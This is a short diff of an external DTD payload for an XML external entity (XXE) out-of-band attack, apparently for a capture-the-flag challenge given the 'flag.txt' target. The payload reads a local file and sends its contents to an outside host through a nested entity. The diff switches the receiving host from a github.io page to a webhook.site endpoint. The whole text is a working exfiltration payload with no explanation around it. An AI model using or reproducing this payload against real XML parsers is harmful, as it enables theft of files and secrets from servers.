@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///home/app/flag.txt">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://AminiL.github.io/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://webhook.site/02865330-d6ae-4e35-8e5f-e364011b2de1/?x=%file;'>">
 %eval;
 %exfiltrate;
